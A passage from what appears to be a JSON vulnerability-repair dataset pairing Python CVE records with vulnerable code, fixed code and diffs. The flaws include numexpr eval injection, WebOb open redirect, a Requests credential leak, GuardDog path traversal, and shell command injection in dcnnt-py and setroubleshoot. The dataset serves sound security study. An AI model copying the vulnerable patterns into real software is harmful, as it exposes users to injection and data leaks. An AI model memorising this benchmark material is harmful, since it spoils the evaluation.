      {
        "id": "vul_py_35_1",
        "commit": "74d5973",
        "file_path": "numexpr/necompiler.py",
        "start_line": 263,
        "end_line": 296,
        "snippet": "def stringToExpression(s, types, context):\n    \"\"\"Given a string, convert it to a tree of ExpressionNode's.\n    \"\"\"\n    old_ctx = expressions._context.get_current_context()\n    try:\n        expressions._context.set_new_context(context)\n        # first compile to a code object to determine the names\n        if context.get('truediv', False):\n            flags = __future__.division.compiler_flag\n        else:\n            flags = 0\n        c = compile(s, '<expr>', 'eval', flags)\n        # make VariableNode's for the names\n        names = {}\n        for name in c.co_names:\n            if name == \"None\":\n                names[name] = None\n            elif name == \"True\":\n                names[name] = True\n            elif name == \"False\":\n                names[name] = False\n            else:\n                t = types.get(name, default_type)\n                names[name] = expressions.VariableNode(name, type_to_kind[t])\n        names.update(expressions.functions)\n        # now build the expression\n        ex = eval(c, names)\n        if expressions.isConstant(ex):\n            ex = expressions.ConstantNode(ex, expressions.getKind(ex))\n        elif not isinstance(ex, expressions.ExpressionNode):\n            raise TypeError(\"unsupported expression type: %s\" % type(ex))\n    finally:\n        expressions._context.set_new_context(old_ctx)\n    return ex"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_35_1",
        "commit": "4b2d89c",
        "file_path": "numexpr/necompiler.py",
        "start_line": 263,
        "end_line": 306,
        "snippet": "_forbidden_re = re.compile('[\\;[\\:]|__')\ndef stringToExpression(s, types, context):\n    \"\"\"Given a string, convert it to a tree of ExpressionNode's.\n    \"\"\"\n    # sanitize the string for obvious attack vectors that NumExpr cannot \n    # parse into its homebrew AST. This is to protect the call to `eval` below.\n    # We forbid `;`, `:`. `[` and `__`\n    # We would like to forbid `.` but it is both a reference and decimal point.\n    if _forbidden_re.search(s) is not None:\n        raise ValueError(f'Expression {s} has forbidden control characters.')\n    \n    old_ctx = expressions._context.get_current_context()\n    try:\n        expressions._context.set_new_context(context)\n        # first compile to a code object to determine the names\n        if context.get('truediv', False):\n            flags = __future__.division.compiler_flag\n        else:\n            flags = 0\n        c = compile(s, '<expr>', 'eval', flags)\n        # make VariableNode's for the names\n        names = {}\n        for name in c.co_names:\n            if name == \"None\":\n                names[name] = None\n            elif name == \"True\":\n                names[name] = True\n            elif name == \"False\":\n                names[name] = False\n            else:\n                t = types.get(name, default_type)\n                names[name] = expressions.VariableNode(name, type_to_kind[t])\n        names.update(expressions.functions)\n\n        # now build the expression\n        ex = eval(c, names)\n        \n        if expressions.isConstant(ex):\n            ex = expressions.ConstantNode(ex, expressions.getKind(ex))\n        elif not isinstance(ex, expressions.ExpressionNode):\n            raise TypeError(\"unsupported expression type: %s\" % type(ex))\n    finally:\n        expressions._context.set_new_context(old_ctx)\n    return ex"
      }
    ],
    "vul_patch": "--- a/numexpr/necompiler.py\n+++ b/numexpr/necompiler.py\n@@ -1,5 +1,14 @@\n+_forbidden_re = re.compile('[\\;[\\:]|__')\n+def stringToExpression(s, types, context):\n     \"\"\"Given a string, convert it to a tree of ExpressionNode's.\n     \"\"\"\n+    # sanitize the string for obvious attack vectors that NumExpr cannot \n+    # parse into its homebrew AST. This is to protect the call to `eval` below.\n+    # We forbid `;`, `:`. `[` and `__`\n+    # We would like to forbid `.` but it is both a reference and decimal point.\n+    if _forbidden_re.search(s) is not None:\n+        raise ValueError(f'Expression {s} has forbidden control characters.')\n+    \n     old_ctx = expressions._context.get_current_context()\n     try:\n         expressions._context.set_new_context(context)\n@@ -22,8 +31,10 @@\n                 t = types.get(name, default_type)\n                 names[name] = expressions.VariableNode(name, type_to_kind[t])\n         names.update(expressions.functions)\n+\n         # now build the expression\n         ex = eval(c, names)\n+        \n         if expressions.isConstant(ex):\n             ex = expressions.ConstantNode(ex, expressions.getKind(ex))\n         elif not isinstance(ex, expressions.ExpressionNode):\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-39631:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/numexpr\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-39631/bin/python -m pytest numexpr/tests/test_numexpr.py -k test_forbidden_tokens -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-39631:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/numexpr\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-39631/bin/python -m pytest numexpr/tests/test_numexpr.py -k \"not test_illegal_value and not test_re_evaluate_dict and not test_validate_dict\" -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2024-42353",
    "cve_description": "WebOb provides objects for HTTP requests and responses. When WebOb normalizes the HTTP Location header to include the request hostname, it does so by parsing the URL that the user is to be redirected to with Python's urlparse, and joining it to the base URL. `urlparse` however treats a `//` at the start of a string as a URI without a scheme, and then treats the next part as the hostname. `urljoin` will then use that hostname from the second part as the hostname replacing the original one from the request. This vulnerability is patched in WebOb version 1.8.8.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/Pylons/webob",
    "patch_url": [
      "https://github.com/Pylons/webob/commit/f689bcf4f0a1f64f1735b1d5069aef5be6974b5b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_107_1",
        "commit": "7bf29f1",
        "file_path": "src/webob/response.py",
        "start_line": 1283,
        "end_line": 1288,
        "snippet": "    def _make_location_absolute(environ, value):\n        if SCHEME_RE.search(value):\n            return value\n\n        new_location = urlparse.urljoin(_request_uri(environ), value)\n        return new_location"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_107_1",
        "commit": "f689bcf",
        "file_path": "src/webob/response.py",
        "start_line": 1283,
        "end_line": 1293,
        "snippet": "    def _make_location_absolute(environ, value):\n        if SCHEME_RE.search(value):\n            return value\n\n        # This is to fix an open redirect issue due to the way that\n        # urlparse.urljoin works. See CVE-2024-42353 and\n        # https://github.com/Pylons/webob/security/advisories/GHSA-mg3v-6m49-jhp3\n        if value.startswith(\"//\"):\n            value = \"/%2f{}\".format(value[2:])\n        new_location = urlparse.urljoin(_request_uri(environ), value)\n        return new_location"
      }
    ],
    "vul_patch": "--- a/src/webob/response.py\n+++ b/src/webob/response.py\n@@ -2,5 +2,10 @@\n         if SCHEME_RE.search(value):\n             return value\n \n+        # This is to fix an open redirect issue due to the way that\n+        # urlparse.urljoin works. See CVE-2024-42353 and\n+        # https://github.com/Pylons/webob/security/advisories/GHSA-mg3v-6m49-jhp3\n+        if value.startswith(\"//\"):\n+            value = \"/%2f{}\".format(value[2:])\n         new_location = urlparse.urljoin(_request_uri(environ), value)\n         return new_location\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-47081",
    "cve_description": "Requests is a HTTP library. Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs. Users should upgrade to version 2.32.4 to receive a fix. For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on one's Requests Session.",
    "cwe_info": {
      "CWE-522": {
        "name": "Insufficiently Protected Credentials",
        "description": "The product transmits or stores authentication credentials, but it uses an insecure method that is susceptible to unauthorized interception and/or retrieval."
      }
    },
    "repo": "https://github.com/psf/requests",
    "patch_url": [
      "https://github.com/psf/requests/commit/96ba401c1296ab1dda74a2365ef36d88f7d144ef"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_74_1",
        "commit": "7341690",
        "file_path": "src/requests/utils.py",
        "start_line": "207",
        "end_line": "261",
        "snippet": "def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get(\"NETRC\")\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n        netrc_locations = (f\"~/{f}\" for f in NETRC_FILES)\n\n    try:\n        from netrc import NetrcParseError, netrc\n\n        netrc_path = None\n\n        for f in netrc_locations:\n            try:\n                loc = os.path.expanduser(f)\n            except KeyError:\n                # os.path.expanduser can fail when $HOME is undefined and\n                # getpwuid fails. See https://bugs.python.org/issue20164 &\n                # https://github.com/psf/requests/issues/1846\n                return\n\n            if os.path.exists(loc):\n                netrc_path = loc\n                break\n\n        # Abort early if there isn't one.\n        if netrc_path is None:\n            return\n\n        ri = urlparse(url)\n\n        # Strip port numbers from netloc. This weird `if...encode`` dance is\n        # used for Python 3.2, which doesn't support unicode literals.\n        splitstr = b\":\"\n        if isinstance(url, str):\n            splitstr = splitstr.decode(\"ascii\")\n        host = ri.netloc.split(splitstr)[0]\n\n        try:\n            _netrc = netrc(netrc_path).authenticators(host)\n            if _netrc:\n                # Return with login / password\n                login_i = 0 if _netrc[0] else 1\n                return (_netrc[login_i], _netrc[2])\n        except (NetrcParseError, OSError):\n            # If there was a parsing error or a permissions issue reading the file,\n            # we'll just skip netrc auth unless explicitly asked to raise errors.\n            if raise_errors:\n                raise\n\n    # App Engine hackiness.\n    except (ImportError, AttributeError):\n        pass"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_74_1",
        "commit": "96ba401",
        "file_path": "src/requests/utils.py",
        "start_line": "207",
        "end_line": "255",
        "snippet": "def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get(\"NETRC\")\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n        netrc_locations = (f\"~/{f}\" for f in NETRC_FILES)\n\n    try:\n        from netrc import NetrcParseError, netrc\n\n        netrc_path = None\n\n        for f in netrc_locations:\n            try:\n                loc = os.path.expanduser(f)\n            except KeyError:\n                # os.path.expanduser can fail when $HOME is undefined and\n                # getpwuid fails. See https://bugs.python.org/issue20164 &\n                # https://github.com/psf/requests/issues/1846\n                return\n\n            if os.path.exists(loc):\n                netrc_path = loc\n                break\n\n        # Abort early if there isn't one.\n        if netrc_path is None:\n            return\n\n        ri = urlparse(url)\n        host = ri.hostname\n\n        try:\n            _netrc = netrc(netrc_path).authenticators(host)\n            if _netrc:\n                # Return with login / password\n                login_i = 0 if _netrc[0] else 1\n                return (_netrc[login_i], _netrc[2])\n        except (NetrcParseError, OSError):\n            # If there was a parsing error or a permissions issue reading the file,\n            # we'll just skip netrc auth unless explicitly asked to raise errors.\n            if raise_errors:\n                raise\n\n    # App Engine hackiness.\n    except (ImportError, AttributeError):\n        pass"
      }
    ],
    "vul_patch": "--- a/src/requests/utils.py\n+++ b/src/requests/utils.py\n@@ -30,13 +30,7 @@\n             return\n \n         ri = urlparse(url)\n-\n-        # Strip port numbers from netloc. This weird `if...encode`` dance is\n-        # used for Python 3.2, which doesn't support unicode literals.\n-        splitstr = b\":\"\n-        if isinstance(url, str):\n-            splitstr = splitstr.decode(\"ascii\")\n-        host = ri.netloc.split(splitstr)[0]\n+        host = ri.hostname\n \n         try:\n             _netrc = netrc(netrc_path).authenticators(host)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-23530",
    "cve_description": "GuardDog is a CLI tool to identify malicious PyPI packages. Versions prior to v0.1.8 are vulnerable to arbitrary file write when scanning a specially-crafted remote PyPI package. Extracting files using shutil.unpack_archive() from a potentially malicious tarball without validating that the destination file path is within the intended destination directory can cause files outside the destination directory to be overwritten.  This issue is patched in version 0.1.8. Potential workarounds include using a safer module, like zipfile, and validating the location of the extracted files and discarding those with malicious paths.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/DataDog/guarddog",
    "patch_url": [
      "https://github.com/DataDog/guarddog/commit/37c7d0767ba28f4df46117d478f97652594c491c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_194_1",
        "commit": "8e814de",
        "file_path": "guarddog/scanners/package_scanner.py",
        "start_line": 149,
        "end_line": 164,
        "snippet": "    def download_compressed(self, url, zippath, unzippedpath):\n        \"\"\"Downloads a compressed file and extracts it\n\n        Args:\n            url (str): download link\n            zippath (str): path to download compressed file\n            unzippedpath (str): path to unzip compressed file\n        \"\"\"\n\n        response = requests.get(url, stream=True)\n\n        with open(zippath, \"wb\") as f:\n            f.write(response.raw.read())\n\n        shutil.unpack_archive(zippath, unzippedpath)\n        os.remove(zippath)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_194_1",
        "commit": "37c7d07",
        "file_path": "guarddog/scanners/package_scanner.py",
        "start_line": 148,
        "end_line": 166,
        "snippet": "    def download_compressed(self, url, zippath, unzippedpath):\n        \"\"\"Downloads a compressed file and extracts it\n\n        Args:\n            url (str): download link\n            zippath (str): path to download compressed file\n            unzippedpath (str): path to unzip compressed file\n        \"\"\"\n\n        response = requests.get(url, stream=True)\n\n        with open(zippath, \"wb\") as f:\n            f.write(response.raw.read())\n\n        if zippath.endswith('.tar.gz'):\n            tarsafe.open(zippath).extractall(unzippedpath)\n            os.remove(zippath)\n        else:\n            raise ValueError(\"unsupported archive extension: \" + zippath)"
      }
    ],
    "vul_patch": "--- a/guarddog/scanners/package_scanner.py\n+++ b/guarddog/scanners/package_scanner.py\n@@ -12,5 +12,8 @@\n         with open(zippath, \"wb\") as f:\n             f.write(response.raw.read())\n \n-        shutil.unpack_archive(zippath, unzippedpath)\n-        os.remove(zippath)\n+        if zippath.endswith('.tar.gz'):\n+            tarsafe.open(zippath).extractall(unzippedpath)\n+            os.remove(zippath)\n+        else:\n+            raise ValueError(\"unsupported archive extension: \" + zippath)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-7694",
    "cve_description": "This affects all versions of package uvicorn. The request logger provided by the package is vulnerable to ASNI escape sequence injection. Whenever any HTTP request is received, the default behaviour of uvicorn is to log its details to either the console or a log file. When attackers request crafted URLs with percent-encoded escape sequences, the logging component will log the URL after it's been processed with urllib.parse.unquote, therefore converting any percent-encoded characters into their single-character equivalent, which can have special meaning in terminal emulators. By requesting URLs with crafted paths, attackers can: * Pollute uvicorn's access logs, therefore jeopardising the integrity of such files. * Use ANSI sequence codes to attempt to interact with the terminal emulator that's displaying the logs (either in real time or from a file).",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/encode/uvicorn",
    "patch_url": [
      "https://github.com/encode/uvicorn/commit/895807f94ea9a8e588605c12076b7d7517cda503"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_172_1",
        "commit": "789e2f1",
        "file_path": "uvicorn/logging.py",
        "start_line": 79,
        "end_line": 80,
        "snippet": "    def get_path(self, scope):\n        return scope.get(\"root_path\", \"\") + scope[\"path\"]"
      },
      {
        "id": "vul_py_172_2",
        "commit": "789e2f1",
        "file_path": "uvicorn/logging.py",
        "start_line": 82,
        "end_line": 87,
        "snippet": "    def get_full_path(self, scope):\n        path = scope.get(\"root_path\", \"\") + scope[\"path\"]\n        query_string = scope.get(\"query_string\", b\"\").decode(\"ascii\")\n        if query_string:\n            return path + \"?\" + query_string\n        return path"
      },
      {
        "id": "vul_py_172_3",
        "commit": "789e2f1",
        "file_path": "uvicorn/protocols/utils.py",
        "start_line": 51,
        "end_line": 57,
        "snippet": "def get_path_with_query_string(scope):\n    path_with_query_string = scope.get(\"root_path\", \"\") + scope[\"path\"]\n    if scope[\"query_string\"]:\n        path_with_query_string = \"{}?{}\".format(\n            path_with_query_string, scope[\"query_string\"].decode(\"ascii\")\n        )\n    return path_with_query_string"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_172_1",
        "commit": "895807f",
        "file_path": "uvicorn/logging.py",
        "start_line": 80,
        "end_line": 81,
        "snippet": "    def get_path(self, scope):\n        return urllib.parse.quote(scope.get(\"root_path\", \"\") + scope[\"path\"])"
      },
      {
        "id": "fix_py_172_2",
        "commit": "895807f",
        "file_path": "uvicorn/logging.py",
        "start_line": 83,
        "end_line": 88,
        "snippet": "    def get_full_path(self, scope):\n        path = scope.get(\"root_path\", \"\") + scope[\"path\"]\n        query_string = scope.get(\"query_string\", b\"\").decode(\"ascii\")\n        if query_string:\n            return urllib.parse.quote(path) + \"?\" + query_string\n        return urllib.parse.quote(path)"
      },
      {
        "id": "fix_py_172_3",
        "commit": "895807f",
        "file_path": "uvicorn/protocols/utils.py",
        "start_line": 52,
        "end_line": 60,
        "snippet": "def get_path_with_query_string(scope):\n    path_with_query_string = urllib.parse.quote(\n        scope.get(\"root_path\", \"\") + scope[\"path\"]\n    )\n    if scope[\"query_string\"]:\n        path_with_query_string = \"{}?{}\".format(\n            path_with_query_string, scope[\"query_string\"].decode(\"ascii\")\n        )\n    return path_with_query_string"
      }
    ],
    "vul_patch": "--- a/uvicorn/logging.py\n+++ b/uvicorn/logging.py\n@@ -1,2 +1,2 @@\n     def get_path(self, scope):\n-        return scope.get(\"root_path\", \"\") + scope[\"path\"]\n+        return urllib.parse.quote(scope.get(\"root_path\", \"\") + scope[\"path\"])\n\n--- a/uvicorn/logging.py\n+++ b/uvicorn/logging.py\n@@ -2,5 +2,5 @@\n         path = scope.get(\"root_path\", \"\") + scope[\"path\"]\n         query_string = scope.get(\"query_string\", b\"\").decode(\"ascii\")\n         if query_string:\n-            return path + \"?\" + query_string\n-        return path\n+            return urllib.parse.quote(path) + \"?\" + query_string\n+        return urllib.parse.quote(path)\n\n--- a/uvicorn/protocols/utils.py\n+++ b/uvicorn/protocols/utils.py\n@@ -1,5 +1,7 @@\n def get_path_with_query_string(scope):\n-    path_with_query_string = scope.get(\"root_path\", \"\") + scope[\"path\"]\n+    path_with_query_string = urllib.parse.quote(\n+        scope.get(\"root_path\", \"\") + scope[\"path\"]\n+    )\n     if scope[\"query_string\"]:\n         path_with_query_string = \"{}?{}\".format(\n             path_with_query_string, scope[\"query_string\"].decode(\"ascii\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-1000",
    "cve_description": "A vulnerability was found in cyanomiko dcnnt-py up to 0.9.0. It has been classified as critical. Affected is the function main of the file dcnnt/plugins/notifications.py of the component Notification Handler. The manipulation leads to command injection. It is possible to launch the attack remotely. Upgrading to version 0.9.1 is able to address this issue. The patch is identified as b4021d784a97e25151a5353aa763a741e9a148f5. It is recommended to upgrade the affected component. VDB-262230 is the identifier assigned to this vulnerability.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/cyanomiko/dcnnt-py",
    "patch_url": [
      "https://github.com/cyanomiko/dcnnt-py/commit/b4021d784a97e25151a5353aa763a741e9a148f5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_211_1",
        "commit": "4084ea1",
        "file_path": "dcnnt/plugins/notifications.py",
        "start_line": 31,
        "end_line": 58,
        "snippet": "    def main(self):\n        while True:\n            request = self.rpc_read()\n            self.log(request)\n            if request is None:\n                self.log('No more requests, stop handler')\n                return\n            cmd = self.conf('cmd')\n            if not cmd:\n                return\n            if request.method == 'notification':\n                icon_data = self.read() if request.params.get('packageIcon', False) else None\n                if request.params.get('event') == 'posted':\n                    text, package = map(request.params.get, ('text', 'package'))\n                    title = request.params.get('title', 'NULL')\n                    name, uin = self.device.name, self.device.uin\n                    if text is None:\n                        text = ''\n                    icon_path = os.path.join(self.conf('icon_dir'), f'{package}.{self.device.uin}.icon.png')\n                    if bool(icon_data):\n                        try:\n                            open(icon_path, 'wb').write(icon_data)\n                        except Exception as e:\n                            self.log(e, logging.WARNING)\n                    icon = icon_path if icon_data else ''\n                    command = cmd.format(uin=uin, name=name, icon=icon, text=text, title=title, package=package)\n                    self.log('Execute: \"{}\"'.format(command))\n                    subprocess.call(command, shell=True)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_211_1",
        "commit": "b4021d7",
        "file_path": "dcnnt/plugins/notifications.py",
        "start_line": 32,
        "end_line": 59,
        "snippet": "    def main(self):\n        while True:\n            request = self.rpc_read()\n            self.log(request)\n            if request is None:\n                self.log('No more requests, stop handler')\n                return\n            cmd = self.conf('cmd')\n            if not cmd:\n                return\n            if request.method == 'notification':\n                icon_data = self.read() if request.params.get('packageIcon', False) else None\n                if request.params.get('event') == 'posted':\n                    text, package = map(request.params.get, ('text', 'package'))\n                    title = request.params.get('title', 'NULL')\n                    name, uin = self.device.name, self.device.uin\n                    if text is None:\n                        text = ''\n                    icon_path = os.path.join(self.conf('icon_dir'), f'{package}.{self.device.uin}.icon.png')\n                    if bool(icon_data):\n                        try:\n                            open(icon_path, 'wb').write(icon_data)\n                        except Exception as e:\n                            self.log(e, logging.WARNING)\n                    icon = icon_path if icon_data else ''\n                    command = cmd.format(uin=quote(uin), name=quote(name), icon=quote(icon), text=quote(text), title=quote(title), package=quote(package))\n                    self.log('Execute: \"{}\"'.format(command))\n                    subprocess.call(command, shell=True)"
      }
    ],
    "vul_patch": "--- a/dcnnt/plugins/notifications.py\n+++ b/dcnnt/plugins/notifications.py\n@@ -23,6 +23,6 @@\n                         except Exception as e:\n                             self.log(e, logging.WARNING)\n                     icon = icon_path if icon_data else ''\n-                    command = cmd.format(uin=uin, name=name, icon=icon, text=text, title=title, package=package)\n+                    command = cmd.format(uin=quote(uin), name=quote(name), icon=quote(icon), text=quote(text), title=quote(title), package=quote(package))\n                     self.log('Execute: \"{}\"'.format(command))\n                     subprocess.call(command, shell=True)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2016-4989",
    "cve_description": "setroubleshoot allows local users to bypass an intended container protection mechanism and execute arbitrary commands by (1) triggering an SELinux denial with a crafted file name, which is handled by the _set_tpath function in audit_data.py or via a crafted (2) local_id or (3) analysis_id field in a crafted XML document to the run_fix function in SetroubleshootFixit.py, related to the subprocess.check_output and commands.getstatusoutput functions, a different vulnerability than CVE-2016-4445.",
    "cwe_info": {
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/fedora-selinux/setroubleshoot",
    "patch_url": [
      "https://github.com/fedora-selinux/setroubleshoot/commit/dda55aa50db95a25f0d919c3a0d5871827cdc40f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_281_1",
        "commit": "e69378d",
        "file_path": "framework/src/SetroubleshootFixit.py",
        "start_line": 16,
        "end_line": 19,
        "snippet": "    def run_fix(self, local_id, analysis_id):\n        import commands\n        command = \"sealert -f %s -P %s\" % ( local_id, analysis_id)\n        return commands.getoutput(command)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_281_1",
        "commit": "dda55aa50db95a25f0d919c3a0d5871827cdc40f",
        "file_path": "framework/src/SetroubleshootFixit.py",
        "start_line": 16,
        "end_line": 19,
        "snippet": "    def run_fix(self, local_id, analysis_id):\n        import subprocess\n        command = [\"sealert\", \"-f\", local_id, \"-P\", analysis_id]\n        return subprocess.check_output(command, universal_newlines=True)"
      }
    ],
    "vul_patch": "--- a/framework/src/SetroubleshootFixit.py\n+++ b/framework/src/SetroubleshootFixit.py\n@@ -1,4 +1,4 @@\n     def run_fix(self, local_id, analysis_id):\n-        import commands\n-        command = \"sealert -f %s -P %s\" % ( local_id, analysis_id)\n-        return commands.getoutput(command)\n+        import subprocess\n+        command = [\"sealert\", \"-f\", local_id, \"-P\", analysis_id]\n+        return subprocess.check_output(command, universal_newlines=True)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-41146",
    "cve_description": "qutebrowser is an open source keyboard-focused browser with a minimal GUI. Starting with qutebrowser v1.7.0, the Windows installer for qutebrowser registers a `qutebrowserurl:` URL handler. With certain applications, opening a specially crafted `qutebrowserurl:...` URL can lead to execution of qutebrowser commands, which in turn allows arbitrary code execution via commands such as `:spawn` or `:debug-pyeval`. Only Windows installs where qutebrowser is registered as URL handler are affected. The issue has been fixed in qutebrowser v2.4.0. The fix also adds additional hardening for potential similar issues on Linux (by adding the new --untrusted-args flag to the .desktop file), though no such vulnerabilities are known.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/qutebrowser/qutebrowser",
    "patch_url": [
      "https://github.com/qutebrowser/qutebrowser/commit/8f46ba3f6dc7b18375f7aa63c48a1fe461190430"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_329_1",
        "commit": "1547a48",
        "file_path": "qutebrowser/qutebrowser.py",
        "start_line": 210,
        "end_line": 220,
        "snippet": "def main():\n    parser = get_argparser()\n    argv = sys.argv[1:]\n    args = parser.parse_args(argv)\n    if args.json_args is not None:\n        args = _unpack_json_args(args)\n    earlyinit.early_init(args)\n    # We do this imports late as earlyinit needs to be run first (because of\n    # version checking and other early initialization)\n    from qutebrowser import app\n    return app.run(args)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_329_1",
        "commit": "8f46ba3f6dc7b18375f7aa63c48a1fe461190430",
        "file_path": "qutebrowser/qutebrowser.py",
        "start_line": 234,
        "end_line": 245,
        "snippet": "def main():\n    _validate_untrusted_args(sys.argv)\n    parser = get_argparser()\n    argv = sys.argv[1:]\n    args = parser.parse_args(argv)\n    if args.json_args is not None:\n        args = _unpack_json_args(args)\n    earlyinit.early_init(args)\n    # We do this imports late as earlyinit needs to be run first (because of\n    # version checking and other early initialization)\n    from qutebrowser import app\n    return app.run(args)"
      },
      {
        "id": "fix_py_329_2",
        "commit": "8f46ba3f6dc7b18375f7aa63c48a1fe461190430",
        "file_path": "qutebrowser/qutebrowser.py",
        "start_line": 215,
        "end_line": 233,
        "snippet": "def _validate_untrusted_args(argv):\n    # NOTE: Do not use f-strings here, as this should run with older Python\n    # versions (so that a proper error can be displayed)\n    try:\n        untrusted_idx = argv.index('--untrusted-args')\n    except ValueError:\n        return\n\n    rest = argv[untrusted_idx + 1:]\n    if len(rest) > 1:\n        sys.exit(\n            \"Found multiple arguments ({}) after --untrusted-args, \"\n            \"aborting.\".format(' '.join(rest)))\n\n    for arg in rest:\n        if arg.startswith(('-', ':')):\n            sys.exit(\"Found {} after --untrusted-args, aborting.\".format(arg))\n\n"
      }
    ],
